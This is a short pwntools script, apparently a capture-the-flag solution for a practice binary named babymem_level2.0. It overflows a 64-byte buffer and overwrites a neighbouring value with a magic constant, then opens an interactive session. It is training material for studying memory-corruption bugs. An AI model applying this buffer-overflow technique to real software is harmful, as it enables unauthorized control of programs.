from pwn import *

p = process('/challenge/babymem_level2.0')

p.recvuntil('Payload size:')
p.sendline(b'68')

payload = b'a' * 64 + p32(0x39996e07) 

p.recvuntil('Send your payload (up to 68 bytes)!')
p.sendline(payload)

p.interactive()

